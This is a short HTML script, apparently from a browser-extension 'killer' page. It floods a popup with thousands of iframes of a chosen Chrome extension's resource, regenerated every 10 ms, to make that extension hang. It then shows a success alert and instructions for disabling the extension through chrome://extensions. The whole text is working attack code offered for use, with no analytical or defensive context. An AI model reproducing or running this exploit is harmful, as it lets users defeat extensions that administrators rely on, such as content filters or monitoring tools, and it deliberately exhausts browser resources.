<script>
  function replaceIframes(container, iframeSrc) {
    for (var i = 0; i < 1000; i++) {
      var iframe = document.createElement('iframe');
      iframe.src = iframeSrc;
      iframe.style.width = '10px';
      iframe.style.height = '10px';
      iframe.setAttribute('frameborder', '0');
      container.appendChild(iframe);
    }
    setTimeout(function() {
      while (container.firstChild) {
        container.removeChild(container.firstChild);
      }
      replaceIframes(container, iframeSrc);
    }, 10);
  }
  
  function warning() {
    var overlay = document.getElementById("overlay");
    overlay.style.display = "flex";
    var iframeSelect = document.getElementById("iframeSelect");
    var selectedOption = iframeSelect.options[iframeSelect.selectedIndex].text;
    var selectedSrc = iframeSelect.value;
    var popup = window.open("", "PopupWindow", "width=10000,height=10000");
    var popupDocument = popup.document;
    var popupBody = popupDocument.body;
    var iframeContainer = popupDocument.createElement('div');
    iframeContainer.id = 'iframeContainer';
    popupBody.appendChild(iframeContainer);
    replaceIframes(iframeContainer, selectedSrc);
    setTimeout(function() {
      popup.close();
      overlay.style.display = "none";
      alert(selectedOption + " was hanged successfully!");
      var extensionId = selectedSrc.substring(selectedSrc.indexOf("//") + 2, selectedSrc.indexOf("/", selectedSrc.indexOf("//") + 2)); // Extract extension ID
      var extensionURL = "chrome-extension://" + extensionId;
      document.getElementById("killExtensionText").innerHTML = "In order to kill the extension <strong>" + selectedOption + "</strong>, go to <strong>" + extensionURL + "/manifest.json </strong> and then open a new tab and go to <strong>chrome://extensions/?id=" + extensionId + "</strong>. Then flip the allow access to file URLs switch ONLY ONCE.";
      document.getElementById("killExtensionText").style.display = "block"; // Show the text
    }, 20000);
  }
</script>
